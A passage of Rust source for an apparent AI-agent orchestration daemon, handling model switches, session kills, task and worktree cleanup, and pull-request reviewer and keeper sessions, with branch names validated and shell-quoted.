            Some(Seat::Reviewer | Seat::Keeper) => {
                anyhow::bail!("a review or keeper session works for a request")
            }
        };
        let events = self.store.list_session_events(&old.id).await?;
        let handoff = handoff_text(&events, HANDOFF_BUDGET);
        let prompt = [plan.briefing, Some(handoff), plan.resume]
            .into_iter()
            .flatten()
            .collect::<Vec<_>>()
            .join("\n\n");

        let pin = AgentPin {
            model: model.to_string(),
            effort: effort.map(str::to_string),
        };
        let session = self
            .store
            .create_switched_session(
                NewSession {
                    goal_id: old.goal_id.clone(),
                    task_id: old.task_id.clone(),
                    seat: old.seat(),
                    task_agent_id: old.task_agent_id.clone(),
                    model: pin.model.clone(),
                    effort: pin.effort.clone(),
                    worktree_path: plan.worktree.clone(),
                    pull_request_id: old.pull_request_id.clone(),
                },
                &old.id,
            )
            .await?;
        self.store
            .create_event(NewAgentEvent {
                session_id: Some(old.id.clone()),
                task_id: old.task_id.clone(),
                kind: "session.switched".into(),
                payload: serde_json::json!({
                    "session_id": old.id,
                    "to": session.id,
                    "model": pin.model,
                    "effort": pin.effort,
                    "reason": reason,
                }),
            })
            .await?;
        crate::stats::record_switch(
            &self.store,
            &old,
            serde_json::json!({
                "to_model": pin.model,
                "to_effort": pin.effort,
                "reason": reason,
                "automatic": reason == "exhausted",
                "same_agent": false,
            }),
        )
        .await;
        self.store
            .set_session_status(&old.id, SessionStatus::Exited)
            .await?;
        crate::stats::record_session_end(&self.store, &old.id).await;
        self.move_seat_pin(&old, &pin).await?;

        if session.seat.is_none() {
            if let Some(title) = &old.title {
                self.store
                    .set_session_title_if_unset(&session.id, title)
                    .await?;
            }
            let result = self.launch_loose(&session, plan.cwd, None, &prompt).await;
            if result.is_err() {
                self.store
                    .set_session_status(&session.id, SessionStatus::Failed)
                    .await?;
                crate::stats::record_session_end(&self.store, &session.id).await;
            }
            result?;
            // A loose session has no seat to find its siblings by: the
            // row it replaced is the one superseded.
            self.store.clear_session_attention(&old.id).await?;
        } else {
            // A pull request session goes by its request's title (026).
            if session.pull_request_id.is_some()
                && let Some(title) = &old.title
            {
                self.store
                    .set_session_title_if_unset(&session.id, title)
                    .await?;
            }
            self.spawn(&session, plan.cwd, prompt).await?;
        }
        self.store
            .get_session(&session.id)
            .await
            .map_err(Into::into)
    }

    /// Move the pin of the seat a switched session sits on, so a later spawn
    /// or resume of the seat runs on the new one: the goal's for an
    /// orchestrator, the staffed agent's for a column's agent. A loose
    /// session and a review session have no seat pin to move.
    async fn move_seat_pin(&self, old: &AgentSession, pin: &AgentPin) -> Result<()> {
        match (old.seat(), &old.task_agent_id, &old.goal_id) {
            (Some(Seat::Orchestrator), _, Some(goal_id)) => {
                self.store.set_goal_pin(goal_id, pin).await?;
            }
            (Some(Seat::Agent), Some(agent_id), _) => {
                self.store.set_agent_pin(agent_id, pin).await?;
            }
            _ => {}
        }
        Ok(())
    }

    /// Where a switched loose session goes on: the directory it ran in.
    fn loose_switch(&self, old: &AgentSession) -> Result<SwitchPlan> {
        let cwd = old
            .worktree_path
            .as_deref()
            .map(PathBuf::from)
            .filter(|path| path.is_dir())
            .context("the loose session's working directory is gone")?;
        Ok(SwitchPlan {
            worktree: old.worktree_path.clone(),
            cwd,
            briefing: None,
            resume: None,
        })
    }

    /// The orchestrator's switch: the first repository, the goal's briefing,
    /// and the nudge a quiet orchestrator gets.
    async fn orchestrator_switch(&self, old: &AgentSession) -> Result<SwitchPlan> {
        let goal_id = old.goal_id.as_deref().context("session has no goal")?;
        let goal = self.store.get_goal(goal_id).await?;
        let repos = self.store.list_goal_repositories(goal_id).await?;
        let repo = repos.first().context("goal has no repos")?;
        let briefing = self.orchestrator_briefing(&goal, &repos).await?;
        let template = prompts::template_for(PromptKind::OrchestratorResume);
        let resume = prompts::orchestrator_resume_briefing(template, &goal);
        Ok(SwitchPlan {
            worktree: None,
            cwd: PathBuf::from(&repo.path),
            briefing: Some(briefing),
            resume: Some(resume),
        })
    }

    /// A column agent's switch: the task's one worktree, and its column's
    /// first briefing. The scheduler's next pass hands it the column entry
    /// where the task is in its column.
    async fn agent_switch(&self, old: &AgentSession) -> Result<SwitchPlan> {
        let task = self
            .store
            .get_task(old.task_id.as_deref().context("agent has no task")?)
            .await?;
        let agent_id = old
            .task_agent_id
            .as_deref()
            .context("session has no staffed agent")?;
        let agent = self.store.get_task_agent(agent_id).await?;
        let steps = self.store.goal_steps(&task.goal_id).await?;
        let step = steps
            .iter()
            .find(|s| s.id == agent.step)
            .context("the agent's column is not one of the task's")?;
        let repo = self.store.get_repository(&task.repo_id).await?;
        let worktree = self
            .task_worktree(
                &task,
                &repo,
                task.worktree_path
                    .clone()
                    .or_else(|| old.worktree_path.clone())
                    .map(PathBuf::from),
            )
            .await?;
        Ok(SwitchPlan {
            worktree: Some(worktree.display().to_string()),
            cwd: worktree,
            briefing: Some(self.step_first_briefing(&task, step, "").await?),
            resume: None,
        })
    }

    /// Kill a session's agent process — the daemon-owned child — and mark
    /// the session exited.
    ///
    /// The run's `session_ended` fact waits for the reap, off the caller's
    /// path: the driver is still cancelling the turn, and the cancelled turn
    /// reports its stop and what it spent only then (023). The fact is taken
    /// off the row exactly as the kill wrote it, and the session's next
    /// launch waits until the fact is written, so a resume neither takes the
    /// killed run's fact away nor adds its own turns and tokens to it.
    pub async fn kill_session(&self, session_id: &str) -> Result<()> {
        let session = self.store.get_session(session_id).await?;
        let (reaped, gate) = self.acp.kill_gated(&session.id);
        if session.status().is_live() {
            let ended = self
                .store
                .set_session_status(session_id, SessionStatus::Exited)
                .await?;
            let store = self.store.clone();
            tokio::spawn(async move {
                reaped.await;
                crate::stats::record_run_end(&store, &ended).await;
                drop(gate);
            });
        }
        Ok(())
    }

    /// Follow the branch of every task that already has a worktree.
    ///
    /// What the daemon does once at startup: the watches live only as long as
    /// the process holding them, and the tasks in flight when the last one
    /// stopped are still being committed to. A task whose repository cannot be
    /// read is skipped rather than failing the sweep — the others are worth
    /// following either way.
    pub async fn watch_task_branches(&self) -> Result<()> {
        for task in self.store.list_tasks(TaskFilter::default()).await? {
            let repo = match self.store.get_repository(&task.repo_id).await {
                Ok(repo) => repo,
                Err(e) => {
                    tracing::warn!(task = %task.id, error = %e, "cannot follow the task branch");
                    continue;
                }
            };
            if worth_following(&task) {
                self.branches.watch(&task, Path::new(&repo.path));
            }
        }
        Ok(())
    }

    /// Cleanup after a finished/cancelled task: kill sessions, remove
    /// worktrees, optionally delete the branch. Idempotent: safe to call
    /// repeatedly on the same task.
    ///
    /// `remove_worktrees = false` keeps the worktree on disk (and therefore
    /// also the branch — the worktree has it checked out, which pins it) so
    /// finished or cancelled work can be inspected later.
    pub async fn cleanup_task(
        &self,
        task_id: &str,
        remove_worktrees: bool,
        delete_branch: bool,
    ) -> Result<()> {
        let task = self.store.get_task(task_id).await?;
        let repo = self.store.get_repository(&task.repo_id).await?;
        let repo_path = PathBuf::from(&repo.path);
        // The task is over: whatever happens to its branch from here is not
        // something anybody is following it for.
        self.branches.unwatch(task_id);

        for session in self
            .store
            .list_sessions(SessionFilter {
                task_id: Some(task.id.clone()),
                live_only: true,
                ..Default::default()
            })
            .await?
        {
            if self.acp.is_user_resumed(&session.id) {
                continue;
            }
            if self.acp.is_running(&session.id) {
                tracing::info!(task = %task.id, session = %session.id, "cleanup: killing agent session");
            }
            self.kill_session(&session.id).await.ok();
        }

        if !remove_worktrees
            || self
                .store
                .list_sessions(SessionFilter {
                    task_id: Some(task.id.clone()),
                    ..Default::default()
                })
                .await?
                .iter()
                .any(|session| self.acp.is_user_resumed(&session.id))
        {
            return Ok(());
        }

        // Tracked so the prune below runs only over a repository this call
        // actually changed: a settled task — its worktrees already gone —
        // is reconciled again every tick for as long as its goal stays
        // `cancelled` or `completed`, and a `git worktree prune` spawned on
        // every one of those ticks forever is a process the repository has
        // nothing new to tell it about.
        let mut removed_a_worktree = false;
        for session in self
            .store
            .list_sessions(SessionFilter {
                task_id: Some(task.id.clone()),
                ..Default::default()
            })
            .await?
        {
            if self.acp.is_user_resumed(&session.id) {
                continue;
            }
            if let Some(wt) = &session.worktree_path {
                let wt = PathBuf::from(wt);
                if wt.exists() {
                    tracing::info!(task = %task.id, worktree = %wt.display(), "cleanup: removing worktree");
                    self.git.remove_worktree(&repo_path, &wt).await.ok();
                    removed_a_worktree = true;
                }
            }
        }
        if let Some(wt) = &task.worktree_path {
            let wt = PathBuf::from(wt);
            if wt.exists() {
                tracing::info!(task = %task.id, worktree = %wt.display(), "cleanup: removing worktree");
                self.git.remove_worktree(&repo_path, &wt).await.ok();
                if wt.exists() {
                    tracing::warn!(task = %task.id, worktree = %wt.display(), "cleanup: worktree removal failed, will retry");
                } else {
                    removed_a_worktree = true;
                }
            }
            // Cleared only once the directory is actually gone: a goal
            // settled long ago is reconciled again every tick for as long
            // as this stays set, which is also what gets a failed removal
            // retried rather than forgotten.
            if !wt.exists() {
                self.store.set_task_worktree(&task.id, None).await?;
            }
        }
        if removed_a_worktree {
            self.git.prune_worktrees(&repo_path).await.ok();
        }
        // The base branch is never the task's own to delete.
        if delete_branch
            && task.status() == TaskStatus::Finished
            && task.branch != repo.base_branch
            && self
                .git
                .branch_exists(&repo_path, &task.branch)
                .await
                .unwrap_or(false)
        {
            self.git.delete_branch(&repo_path, &task.branch).await.ok();
        }
        Ok(())
    }
}

/// A review session: its worktree detached at the request's head, its row,
/// and its agent (029). The daemon staffs it on the pin asked directly on
/// the row; no goal, task or orchestrator is behind it. A request of the
/// user's own has none: its task's `pr` column keeps it (030), unless the
/// user asked Ariadne to keep it by hand instead, on a keeper session of
/// its own (032).
impl Launcher {
    /// Where a request's worktree is cut: one per request, named by its id.
    fn pull_request_worktree_path(&self, pull_request_id: &str) -> PathBuf {
        self.cfg.worktree_root.join(format!("pr-{pull_request_id}"))
    }

    /// Whether a request's worktree is still on disk.
    pub(crate) fn pull_request_worktree_exists(&self, pull_request_id: &str) -> bool {
        self.pull_request_worktree_path(pull_request_id).exists()
    }

    /// Where a request's keeper worktree is cut (032): one per request,
    /// distinct from the reviewer's, since the two may run beside each
    /// other on the same request.
    fn keeper_worktree_path(&self, pull_request_id: &str) -> PathBuf {
        self.cfg
            .worktree_root
            .join(format!("pr-{pull_request_id}-keep"))
    }

    /// Whether a request's keeper worktree is still on disk.
    pub(crate) fn keeper_worktree_exists(&self, pull_request_id: &str) -> bool {
        self.keeper_worktree_path(pull_request_id).exists()
    }

    /// The local branch a keeper session commits and pushes on (032): one
    /// per request, so the worktree beside it is never an orphan.
    fn keeper_branch(&self, pull_request_id: &str) -> String {
        format!("ariadne/keep-{pull_request_id}")
    }

    /// The worktree of a request the user reviews (029), detached at the
    /// request's head: created on the first spawn, and moved to the head on
    /// every later call. A head the checkout lacks is fetched into
    /// `FETCH_HEAD` alone, from the head repository of a fork, else from the
    /// repository's own remote: the head branch may share its name with a
    /// branch of the checkout.
    pub(crate) async fn review_worktree(
        &self,
        pull: &PullRequest,
        repo: &Repository,
    ) -> Result<PathBuf> {
        let worktree = self.pull_request_worktree_path(&pull.id);
        let repo_path = PathBuf::from(&repo.path);
        if !self.git.has_commit(&repo_path, &pull.head_sha).await? {
            let from = pull.head_repo.clone().unwrap_or_else(|| {
                repo.forge
                    .as_ref()
                    .map_or_else(|| "origin".to_string(), |forge| forge.remote.clone())
            });
            self.git
                .fetch_head_of(&repo_path, &from, &pull.head_branch)
                .await
                .with_context(|| {
                    format!(
                        "fetching the head {} of pull request {}",
                        pull.head_sha, pull.id
                    )
                })?;
            if !self.git.has_commit(&repo_path, &pull.head_sha).await? {
                anyhow::bail!(
                    "{} of {from} does not hold the head {} of pull request {}",
                    pull.head_branch,
                    pull.head_sha,
                    pull.id
                );
            }
        }
        if worktree.is_dir() {
            self.git
                .checkout_detached(&worktree, &pull.head_sha)
                .await?;
            return Ok(worktree);
        }
        std::fs::create_dir_all(&self.cfg.worktree_root)?;
        self.git.prune_worktrees(&repo_path).await.ok();
        self.git
            .add_detached_worktree(&repo_path, &worktree, &pull.head_sha)
            .await?;
        Ok(worktree)
    }

    /// The worktree of a request the user keeps by hand (032), on a local
    /// branch cut from the fetched head branch: created on the first spawn
    /// alone. Unlike [`Self::review_worktree`] this worktree commits and
    /// pushes, so a later call never moves it back to the head — that
    /// would throw away work the keeper has not pushed yet.
    pub(crate) async fn keeper_worktree(
        &self,
        pull: &PullRequest,
        repo: &Repository,
    ) -> Result<(PathBuf, String)> {
        let worktree = self.keeper_worktree_path(&pull.id);
        let branch = self.keeper_branch(&pull.id);
        if worktree.is_dir() {
            return Ok((worktree, branch));
        }
        let repo_path = PathBuf::from(&repo.path);
        let at = match self.git.has_commit(&repo_path, &pull.head_sha).await? {
            true => pull.head_sha.clone(),
            false => {
                let from = self.keeper_remote(pull, repo).await?;
                self.git
                    .fetch_head_of(&repo_path, &from, &pull.head_branch)
                    .await
                    .with_context(|| {
                        format!(
                            "fetching the head branch {} of pull request {}",
                            pull.head_branch, pull.id
                        )
                    })?;
                "FETCH_HEAD".to_string()
            }
        };
        std::fs::create_dir_all(&self.cfg.worktree_root)?;
        self.git.prune_worktrees(&repo_path).await.ok();
        self.git
            .add_worktree_at(&repo_path, &worktree, &branch, &at)
            .await?;
        Ok((worktree, branch))
    }

    /// Where a keeper pushes a fix to, and checks its safety against
    /// (032): the repository's own configured remote, whatever protocol it
    /// uses, for a head on the same repository — the forge always reports
    /// that one over HTTPS, which an SSH-only remote cannot push to — or,
    /// for a genuine fork, that remote's own push URL, with the fork's
    /// owner and name swapped in for the one it is configured with. A
    /// fork needs authenticated transport to fetch a private one, same as
    /// to push to it, and the push URL is the one the user's credentials
    /// are actually set up for — the fetch URL is often plain HTTPS even
    /// where the push one is SSH, exactly because fetching never used to
    /// need to authenticate. Falls back to the forge's own URL where the
    /// configured remote's own cannot be read or rewritten.
    async fn keeper_remote(&self, pull: &PullRequest, repo: &Repository) -> Result<String> {
        let configured = repo
            .forge
            .as_ref()
            .map_or_else(|| "origin".to_string(), |forge| forge.remote.clone());
        let Some(head_repo) = pull.head_repo.as_deref() else {
            return Ok(configured);
        };
        let Some(forge) = repo.forge.as_ref() else {
            return Ok(head_repo.to_string());
        };
        let Some(parsed) = crate::forge::Remote::parse(head_repo) else {
            return Ok(head_repo.to_string());
        };
        if parsed.host.eq_ignore_ascii_case(&forge.host)
            && parsed.owner.eq_ignore_ascii_case(&forge.owner)
            && parsed.name.eq_ignore_ascii_case(&forge.name)
        {
            return Ok(configured);
        }
        let repo_path = Path::new(&repo.path);
        Ok(
            match self.git.remote_push_url(repo_path, &configured).await.ok() {
                Some(url) => crate::forge::Remote::rewrite(&url, &parsed)
                    .unwrap_or_else(|| head_repo.to_string()),
                None => head_repo.to_string(),
            },
        )
    }

    /// The command a keeper session pushes a fix with (032): its local
    /// branch onto the request's own head branch, on the request's head
    /// repository.
    ///
    /// The agent runs this line in its own shell, so the remote and the
    /// head branch are each quoted into one argument: a head branch may
    /// hold `$`, `(`, `;`, `|`, `&` or a backtick, none of which git's own
    /// ref rules forbid.
    async fn keeper_push_command(&self, pull: &PullRequest, repo: &Repository) -> Result<String> {
        Ok(format!(
            "git push {} HEAD:{}",
            shell_quote(&self.keeper_remote(pull, repo).await?),
            shell_quote(&pull.head_branch)
        ))
    }

    /// Whether a keeper's local branch is safe for teardown to discard
    /// (032): its tip is already what the request's head repository has
    /// for the head branch, read with `git ls-remote` rather than a fetch.
    /// Where the remote carries no such branch any more — a merge that
    /// deleted it, most often — safe instead where the request is
    /// actually merged and the local tip is exactly the head the forge
    /// itself last read for it: an unmerged request whose source
    /// vanished has nowhere else its commit is known, whatever head the
    /// forge last read, so teardown must not throw away the only copy of
    /// it either way.
    async fn keeper_branch_is_safe_to_discard(
        &self,
        repo_path: &Path,
        pull: &PullRequest,
        repo: &Repository,
        branch: &str,
    ) -> Result<bool> {
        let local = self.git.branch_tip(repo_path, branch).await?;
        let remote = self.keeper_remote(pull, repo).await?;
        Ok(
            match self
                .git
                .remote_branch_tip(repo_path, &remote, &pull.head_branch)
                .await?
            {
                Some(tip) => tip == local,
                None => pull.state == "merged" && local == pull.head_sha,
            },
        )
    }

    /// Refuse a second live session of `seat` on one request.
    async fn assert_no_live_pull_request_session(
        &self,
        pull_request_id: &str,
        seat: Seat,
    ) -> Result<()> {
        for session in self
            .store
            .list_sessions(SessionFilter {
                pull_request_id: Some(pull_request_id.to_string()),
                live_only: true,
                ..Default::default()
            })
            .await?
        {
            if session.seat() == Some(seat) && self.session_process_alive(&session).await {
                return Err(anyhow!(
                    "a live {} session already watches pull request {pull_request_id}: {}",
                    seat.as_str(),
                    session.id
                ));
            }
        }
        Ok(())
    }

    /// Refuse a reviewer or a keeper session on a head branch git itself
    /// would refuse as a ref name.
    ///
    /// Nothing between here and a real `git` call ever runs a shell over
    /// the branch — `GitManager` always passes it as its own argument, and
    /// the keeper's push command is quoted into one (032) — but a forge
    /// that hands back a value git's own ref rules reject is sending
    /// something no real branch ever is, so no worktree, fetch or session
    /// starts on it. The refusal is recorded on the request the same way a
    /// spawn-retry budget running out already is, since both are automatic
    /// recovery giving up on this row (026).
    async fn assert_valid_head_branch(&self, pull: &PullRequest, seat: Seat) -> Result<()> {
        if ariadne_core::probe::probe_status(
            "git",
            &["check-ref-format", "--branch", &pull.head_branch],
        )
        .await
        {
            return Ok(());
        }
        let _ = match seat {
            Seat::Reviewer => {
                self.store
                    .set_pull_request_reviewer_given_up(&pull.id, false)
                    .await
            }
            Seat::Keeper => {
                self.store
                    .set_pull_request_keeper_given_up(&pull.id, false)
                    .await
            }
            _ => Ok(()),
        };
        Err(anyhow!(
            "pull request {} names a head branch git refuses as a ref: {:?}",
            pull.id,
            pull.head_branch
        ))
    }

    /// Start a fresh review session on a request: its worktree detached at
    /// the head, a row with no goal, task or staffed agent, titled by the
    /// request, and an agent on `pin` that loads `pr-reviewer` and is briefed
    /// on the request.
    pub async fn spawn_pull_request_session(
        &self,
        pull: &PullRequest,
        pin: AgentPin,
    ) -> Result<AgentSession> {
        let seat = Seat::Reviewer;
        self.assert_valid_head_branch(pull, seat).await?;
        self.assert_no_live_pull_request_session(&pull.id, seat)
            .await?;
        let repo = self.store.get_repository(&pull.repository_id).await?;
        let worktree = self.review_worktree(pull, &repo).await?;
        let session = self
            .store
            .create_session(NewSession {
                goal_id: None,
                task_id: None,
                seat: Some(seat),
                task_agent_id: None,
                model: pin.model,
                effort: pin.effort,
                worktree_path: Some(worktree.display().to_string()),
                pull_request_id: Some(pull.id.clone()),
            })
            .await?;
        self.store
            .set_session_title_if_unset(&session.id, &pull.title)
            .await?;
        let briefing = self.pull_request_briefing_of(pull, &repo, &worktree);
        let skills = self.review_skills(pull).await?;
        let ctx = self
            .spawn_ctx_with(&session, worktree, briefing, skills)
            .await?;
        let plan = plan_spawn(&ctx)?;
        self.launch(&session, plan, &ctx.launch_id).await?;
        // The rows this one replaces on the request's seat say nothing more.
        for previous in self
            .store
            .list_sessions(SessionFilter {
                pull_request_id: Some(pull.id.clone()),
                ..Default::default()
            })
            .await?
        {
            if previous.id != session.id
                && previous.seat() == Some(seat)
                && previous.attention_reason().is_some()
            {
                let _ = self.store.clear_session_attention(&previous.id).await;
            }
        }
        self.store
            .get_session(&session.id)
            .await
            .map_err(Into::into)
    }

    /// Put a request's session back on its feet, as a column's agent is
    /// (009): the same row, on the conversation it left behind, in its
    /// worktree. A fresh session is spawned where there is nothing to resume,
    /// where the last launch died on arrival, or where the pin moved since
    /// the last session started: an agent's conversation keeps its model.
    ///
    /// The resume carries the request's briefing again: one short turn that
    /// ends, after which the session waits on the forge for its next news.
    /// A resume with no instruction would leave the agent `running` on no
    /// turn at all, which the watchdog reads as a turn that never ends.
    pub(crate) async fn resume_pull_request_session(
        &self,
        pull: &PullRequest,
        pin: AgentPin,
    ) -> Result<AgentSession> {
        let seat = Seat::Reviewer;
        self.assert_valid_head_branch(pull, seat).await?;
        let previous = self
            .store
            .list_sessions(SessionFilter {
                pull_request_id: Some(pull.id.clone()),
                ..Default::default()
            })
            .await?
            .into_iter()
            .rev()
            .find(|s| s.seat() == Some(seat));
        // A conversation runs on the model it started on, so a pin the
        // user changed since is a fresh session on the new one.
        let Some((previous, internal)) = previous
            .filter(|s| !s.died_on_arrival())
            .filter(|s| s.model == pin.model && s.effort == pin.effort)
            .and_then(|s| s.internal_session_id.clone().map(|internal| (s, internal)))
        else {
            return self.spawn_pull_request_session(pull, pin).await;
        };
        self.assert_no_live_pull_request_session(&pull.id, seat)
            .await?;
        let repo = self.store.get_repository(&pull.repository_id).await?;
        let worktree = self.review_worktree(pull, &repo).await?;
        let session = self
            .store
            .restart_session(&previous.id, Some(&worktree.display().to_string()))
            .await?;
        let briefing = self.pull_request_briefing_of(pull, &repo, &worktree);
        self.launch_resumed(&session, worktree, &internal, &briefing)
            .await
    }

    /// The briefing a request's review session is started and resumed on.
    pub(crate) fn pull_request_briefing_of(
        &self,
        pull: &PullRequest,
        repo: &Repository,
        worktree: &Path,
    ) -> String {
        let login = repo
            .forge
            .as_ref()
            .and_then(|forge| forge.login.clone())
            .unwrap_or_default();
        prompts::pull_request_briefing(
            ariadne_store::defaults::pull_request_briefing_prompt(),
            pull,
            repo,
            &worktree.display().to_string(),
            &login,
        )
    }

    /// Start a fresh keeper session on a request asked
    /// for by hand (032): its worktree on a local branch cut from the
    /// fetched head, a row with no goal, task or staffed agent, titled by
    /// the request, and an agent on `pin` that loads `pr-babysit` and is
    /// briefed on the request.
    pub async fn spawn_keeper_session(
        &self,
        pull: &PullRequest,
        pin: AgentPin,
    ) -> Result<AgentSession> {
        let seat = Seat::Keeper;
        self.assert_valid_head_branch(pull, seat).await?;
        self.assert_no_live_pull_request_session(&pull.id, seat)
            .await?;
        let repo = self.store.get_repository(&pull.repository_id).await?;
        let (worktree, branch) = self.keeper_worktree(pull, &repo).await?;
        let session = self
            .store
            .create_session(NewSession {
                goal_id: None,
                task_id: None,
                seat: Some(seat),
                task_agent_id: None,
                model: pin.model,
                effort: pin.effort,
                worktree_path: Some(worktree.display().to_string()),
                pull_request_id: Some(pull.id.clone()),
            })
            .await?;
        self.store
            .set_session_title_if_unset(&session.id, &pull.title)
            .await?;
        let briefing = self
            .keeper_briefing_of(pull, &repo, &worktree, &branch)
            .await?;
        let skills = self.keeper_skills(pull).await?;
        let ctx = self
            .spawn_ctx_with(&session, worktree, briefing, skills)
            .await?;
        let plan = plan_spawn(&ctx)?;
        self.launch(&session, plan, &ctx.launch_id).await?;
        for previous in self
            .store
            .list_sessions(SessionFilter {
                pull_request_id: Some(pull.id.clone()),
                ..Default::default()
            })
            .await?
        {
            if previous.id != session.id
                && previous.seat() == Some(seat)
                && previous.attention_reason().is_some()
            {
                let _ = self.store.clear_session_attention(&previous.id).await;
            }
        }
        self.store
            .get_session(&session.id)
            .await
            .map_err(Into::into)
    }

    /// Put a request's keeper session back on its feet (032), as
    /// [`Self::resume_pull_request_session`] does a reviewer's.
    pub(crate) async fn resume_keeper_session(
        &self,
        pull: &PullRequest,
        pin: AgentPin,
    ) -> Result<AgentSession> {
        let seat = Seat::Keeper;
        self.assert_valid_head_branch(pull, seat).await?;
        let previous = self
            .store
            .list_sessions(SessionFilter {
                pull_request_id: Some(pull.id.clone()),
                ..Default::default()
            })
            .await?
            .into_iter()
            .rev()
            .find(|s| s.seat() == Some(seat));
        let Some((previous, internal)) = previous
            .filter(|s| !s.died_on_arrival())
            .filter(|s| s.model == pin.model && s.effort == pin.effort)
            .and_then(|s| s.internal_session_id.clone().map(|internal| (s, internal)))
        else {
            return self.spawn_keeper_session(pull, pin).await;
        };
        self.assert_no_live_pull_request_session(&pull.id, seat)
            .await?;
        let repo = self.store.get_repository(&pull.repository_id).await?;
        let (worktree, branch) = self.keeper_worktree(pull, &repo).await?;
        let session = self
            .store
            .restart_session(&previous.id, Some(&worktree.display().to_string()))
            .await?;
        let briefing = self
            .keeper_briefing_of(pull, &repo, &worktree, &branch)
            .await?;
        self.launch_resumed(&session, worktree, &internal, &briefing)
            .await
    }

    /// The briefing a request's keeper session is started and resumed on
    /// (032): the request, its worktree and local branch, and the command
    /// that pushes a fix to it.
    pub(crate) async fn keeper_briefing_of(
        &self,
        pull: &PullRequest,
        repo: &Repository,
        worktree: &Path,
        branch: &str,
    ) -> Result<String> {
        let login = repo
            .forge
            .as_ref()
            .and_then(|forge| forge.login.clone())
            .unwrap_or_default();
        Ok(prompts::pull_request_keeper_briefing(
            ariadne_store::defaults::pull_request_keeper_briefing_prompt(),
            pull,
            repo,
            &worktree.display().to_string(),
            branch,
            &login,
            &self.keeper_push_command(pull, repo).await?,
        ))
    }

    /// Kill every session of a request, reviewer's and keeper's alike, and
    /// remove both their worktrees and the keeper's local branch: what
    /// Ariadne takes down when it stops working on a request whole.
    ///
    /// `pull` is the request's live read, where the caller has one: the
    /// keeper's own safety check reads its head branch and repository off
    /// it. Without one — the forge integration off, so nothing has read
    /// it — the keeper's worktree and branch are left on disk rather than
    /// guessed safe.
    pub(crate) async fn end_pull_request_sessions(
        &self,
        pull_request_id: &str,
        repository_id: &str,
        pull: Option<&PullRequest>,
    ) -> Result<()> {
        self.end_seated_pull_request_work(pull_request_id, repository_id, Seat::Reviewer, None)
            .await?;
        self.end_seated_pull_request_work(pull_request_id, repository_id, Seat::Keeper, pull)
            .await
    }

    /// Kill a request's reviewer session and remove its worktree alone
    /// (029): a keeper session the same row still carries, if any, is left
    /// running.
    pub(crate) async fn end_reviewer_sessions(
        &self,
        pull_request_id: &str,
        repository_id: &str,
    ) -> Result<()> {
        self.end_seated_pull_request_work(pull_request_id, repository_id, Seat::Reviewer, None)
            .await
    }

    /// Kill a request's keeper session, remove its worktree and delete its
    /// local branch (032): a reviewer session the same row still carries,
    /// if any, is left running. `pull` is the request's live read, which
    /// the keeper's own safety check reads its head branch and repository
    /// off.
    pub(crate) async fn end_keeper_sessions(
        &self,
        pull_request_id: &str,
        repository_id: &str,
        pull: &PullRequest,
    ) -> Result<()> {
        self.end_seated_pull_request_work(pull_request_id, repository_id, Seat::Keeper, Some(pull))
            .await
    }

    /// Kill every live session of `seat` on a request and remove its
    /// worktree; a keeper's local branch goes with it, since nothing but
    /// the keeper ever commits there.
    ///
    /// A keeper's worktree and branch are removed only once its work is
    /// confirmed safe to discard (032): a failed removal is returned
    /// rather than swallowed, so the scheduler retries teardown instead of
    /// deleting the row over a worktree still on disk.
    async fn end_seated_pull_request_work(
        &self,
        pull_request_id: &str,
        repository_id: &str,
        seat: Seat,
        pull: Option<&PullRequest>,
    ) -> Result<()> {
        let repo = self.store.get_repository(repository_id).await?;
        let repo_path = PathBuf::from(&repo.path);
        let sessions: Vec<AgentSession> = self
            .store
            .list_sessions(SessionFilter {
                pull_request_id: Some(pull_request_id.to_string()),
                ..Default::default()
            })
            .await?
            .into_iter()
            .filter(|s| s.seat() == Some(seat))
            .collect();
        for session in &sessions {
            if session.status().is_live() || self.acp.is_running(&session.id) {
                tracing::info!(pull_request = %pull_request_id, session = %session.id, "the request ended, killing its session");
                self.kill_session(&session.id).await.ok();
            }
        }
        let mut worktrees: Vec<PathBuf> = sessions
            .iter()
            .filter_map(|s| s.worktree_path.as_deref().map(PathBuf::from))
            .collect();
        worktrees.push(match seat {
            Seat::Keeper => self.keeper_worktree_path(pull_request_id),
            _ => self.pull_request_worktree_path(pull_request_id),
        });
        worktrees.sort();
        worktrees.dedup();
        let keeper_branch = match seat {
            Seat::Keeper => Some(self.keeper_branch(pull_request_id)),
            _ => None,
        };
        // Computed once, whether or not a worktree still exists: a branch
        // nobody checked out any more can still hold a commit the
        // request's head repository never got, and teardown must not
        // drop the only reference to it (032).
        let branch_safe = match &keeper_branch {
            Some(branch) if self.git.branch_exists(&repo_path, branch).await? => match pull {
                Some(pull) => {
                    self.keeper_branch_is_safe_to_discard(&repo_path, pull, &repo, branch)
                        .await?
                }
                None => false,
            },
            _ => true,
        };
        let mut preserved = false;
        for worktree in worktrees.iter().filter(|w| w.exists()) {
            if keeper_branch.is_some() {
                let clean = self.git.is_clean(worktree).await?;
                if !clean || !branch_safe {
                    tracing::warn!(pull_request = %pull_request_id, worktree = %worktree.display(), "the keeper's worktree holds work the request's head lacks, leaving it on disk");
                    preserved = true;
                    continue;
                }
            }
            tracing::info!(pull_request = %pull_request_id, worktree = %worktree.display(), "removing the request's worktree");
            self.git.remove_worktree(&repo_path, worktree).await?;
        }
        self.git.prune_worktrees(&repo_path).await.ok();
        if let Some(branch) = &keeper_branch
            && !preserved
            && branch_safe
            && self.git.branch_exists(&repo_path, branch).await?
        {
            self.git.delete_branch(&repo_path, branch).await?;
        }
        Ok(())
    }

    /// A pull request session's switch: its worktree, its briefing, and no
    /// resume text — the next news is what it works on. A keeper session
    /// keeps its own worktree and branch; a reviewer's moves to the head.
    async fn pull_request_switch(&self, old: &AgentSession) -> Result<SwitchPlan> {
        let pull = self
            .pull_view(old.pull_request_id.as_deref().unwrap_or_default())
            .await?;
        let repo = self.store.get_repository(&pull.repository_id).await?;
        let (worktree, briefing) = match old.seat() {
            Some(Seat::Keeper) => {
                let (worktree, branch) = self.keeper_worktree(&pull, &repo).await?;
                let briefing = self
                    .keeper_briefing_of(&pull, &repo, &worktree, &branch)
                    .await?;
                (worktree, briefing)
            }
            _ => {
                let worktree = self.review_worktree(&pull, &repo).await?;
                let briefing = self.pull_request_briefing_of(&pull, &repo, &worktree);
                (worktree, briefing)
            }
        };
        Ok(SwitchPlan {
            worktree: Some(worktree.display().to_string()),
            cwd: worktree,
            briefing: Some(briefing),
            resume: None,
        })
    }
}

/// The most of a switched session's history its successor is handed, in
/// characters.
const HANDOFF_BUDGET: usize = 240_000;

/// What a switch starts its new session with, by seat: where it runs, and
/// the briefing and resume text around the handoff.
